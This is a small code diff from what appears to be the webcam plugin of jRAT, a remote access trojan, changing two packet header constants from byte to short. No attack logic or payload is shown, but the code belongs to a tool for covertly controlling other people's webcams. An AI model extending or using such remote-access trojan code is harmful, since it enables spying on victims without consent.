@@ -22,8 +22,8 @@ import jrat.api.ui.RATMenuItem;
 
 public class WebcamPlugin extends Plugin {
 
-	public static final byte HEADER_WEBCAM_FRAME = 120;
-	public static final byte HEADER_LIST_WEBCAMS = 121;
+	public static final short HEADER_WEBCAM_FRAME = 120;
+	public static final short HEADER_LIST_WEBCAMS = 121;
 
 	public static RATControlMenuEntry entry;
 	public static boolean enabled;
